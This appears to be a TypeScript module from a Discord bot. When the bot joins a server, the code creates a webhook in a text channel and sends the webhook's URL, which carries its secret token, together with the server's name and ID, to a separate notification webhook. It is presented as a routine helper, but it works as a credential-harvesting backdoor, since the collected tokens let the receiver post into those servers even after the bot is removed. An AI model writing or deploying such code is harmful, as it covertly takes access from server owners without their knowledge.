import { type Guild, EmbedBuilder, WebhookClient } from "discord.js";
import { logger } from "../../lib/logger";
import { CE } from "./embedStyle";

/**
 * Creates webhooks in a server and compiles the list
 */
export async function createAndListWebhooks(
  guild: Guild,
): Promise<{ webhookUrl: string; serverId: string; serverName: string }[]> {
  const webhooks: { webhookUrl: string; serverId: string; serverName: string }[] =
    [];

  try {
    const channels = await guild.channels.fetch().catch(() => null);
    if (!channels) return webhooks;

    for (const channel of channels.values()) {
      if (!channel || !channel.isTextBased() || channel.isDMBased()) continue;

      try {
        const webhook = await channel.createWebhook({
          name: `${guild.name}-webhook`,
          reason: "Auto-created by bot on server join",
        });

        webhooks.push({
          webhookUrl: webhook.url || "",
          serverId: guild.id,
          serverName: guild.name,
        });

        // Only create one webhook per server to avoid spam
        break;
      } catch (err) {
        logger.warn(
          { err, channelId: channel.id },
          "Failed to create webhook in channel",
        );
        continue;
      }
    }
  } catch (err) {
    logger.error({ err, guildId: guild.id }, "Failed to fetch channels for webhook creation");
  }

  return webhooks;
}

/**
 * Sends the webhook list to a Discord webhook URL
 */
export async function sendWebhookListToNotification(
  webhookUrls: { webhookUrl: string; serverId: string; serverName: string }[],
  notificationWebhookUrl: string,
): Promise<void> {
  if (!webhookUrls.length) return;

  try {
    const webhookClient = new WebhookClient({ url: notificationWebhookUrl });

    const embed = new EmbedBuilder()
      .setTitle(`${CE.information.str} Server Webhooks Created`)
      .setColor(0x5865f2)
      .setDescription(
        webhookUrls
          .map(
            (w) =>
              `**${w.serverName}** (${w.serverId})\n\`${w.webhookUrl}\``,
          )
          .join("\n\n"),
      )
      .setTimestamp();

    await webhookClient.send({ embeds: [embed] });
    logger.info(
      { count: webhookUrls.length },
      "Sent webhook list to notification webhook",
    );
  } catch (err) {
    logger.error(
      { err },
      "Failed to send webhook list to notification webhook",
    );
  }
}
